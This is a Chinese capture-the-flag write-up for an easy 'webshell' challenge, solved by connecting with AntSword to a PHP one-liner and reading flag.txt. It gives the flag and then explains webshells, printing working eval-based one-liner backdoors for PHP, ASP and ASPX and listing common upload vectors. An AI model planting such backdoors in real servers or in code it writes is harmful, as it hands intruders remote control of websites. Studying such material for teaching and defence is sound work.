### WriteUp

#### 1.题目名称

webshell

#### 2.难度系数

简单

#### 3.题目来源

Cyberpeace-n3k0

#### 4.题目描述

小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。

![1564997457455](C:\Users\Administrator\Desktop\10-20190805-webshell\WriteUp\images\1564997457455.png)

http://111.198.29.45:36701/

#### 5.解题步骤

##### 	5.1打开网址

![1564997552521](C:\Users\Administrator\Desktop\10-20190805-webshell\WriteUp\images\1564997552521.png)

页面提示webshell，并写了一句话木马，通过木马可知密码是“shell”

##### 		5.2 根据提示使用蚁剑

连接成功后，出现flag.txt,打开flag.txt,得到flag

![1564997847974](C:\Users\Administrator\Desktop\10-20190805-webshell\WriteUp\images\1564997847974.png)

![1564997916818](C:\Users\Administrator\Desktop\10-20190805-webshell\WriteUp\images\1564997916818.png)

#### 6.flag值

cyberpeace{410025d620fcdda2ad6212f12be89f23}

#### 7.延伸

一句话木马

- https://blog.csdn.net/weixin_39190897/article/details/86772765

- 基本原理：利用文件上传漏洞，往目标网站中上传一句话木马，然后就可以在本地通过蚁剑即可获取和控制整个网站目录。

  最简单的一句话木马

  ```
  <?php @eval($_POST['attack']) ?>
  ```

  @表示后面即使执行错误，也不报错。`eval（）`函数表示括号内的语句字符串什么的全都当做代码执行。`$_POST['attack']`表示从页面中获得attack这个参数值。

- 入侵条件

  ```
  （1）木马上传成功，未被杀；
  （2）知道木马的路径在哪；
  （3）上传的木马能正常运行。
  ```

- 常见的一句话木马

  ```
  php的一句话木马： <?php @eval($_POST['pass']);?>
  asp的一句话是：   <%eval request ("pass")%>
  aspx的一句话是：  <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
  ```

webshell

webshell（分类为远程访问木马）是作为一个基于网络的实现的网络安全威胁shell概念。 Webshell可以上传到Web服务器，以允许远程访问Web服务器，例如Web服务器的文件系统。Webshell的独特之处在于它使用户能够通过充当命令行界面的Web浏览器访问Web服务器。用户可以使用Web浏览器通过万维网访问远程计算机在任何类型的系统上，无论是台式计算机还是带有Web浏览器的手机，都可以在远程系统上执行任务。主机或客户端都不需要命令行环境。

简单的说webshell就是web后门，比如php，asp木马后门。黑客在入侵了一个网站后，常常在将这些 asp或php木马后门文件放置在网站服务器的web目录中，与正常的网页文件混在一起。然后就可以用web的方式，通过asp或php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等。

Web shell通过Web应用程序中的漏洞或弱服务器安全配置上传，包括以下内容：

 1. SQL注入 ;
 2. 应用程序和服务中的漏洞（例如NGINX等Web服务器软件或WordPress等内容管理系统应用程序）;
 3. 文件处理和上传漏洞（例如限制可上传的文件类型）;
 4. 远程文件包含（RFI）和本地文件包含（LFI）漏洞;
 5. 远程代码执行 ;
 6. 暴露的管理界面;
 7. 跨站脚本

后门

```
一般而言，后门就是开得比较隐蔽的通道，目的是为入侵者下次再来如期提供方便而留下的一条路子；
网站后门，就是一种为入侵者下次入侵提供便利的脚本接口文件。
```



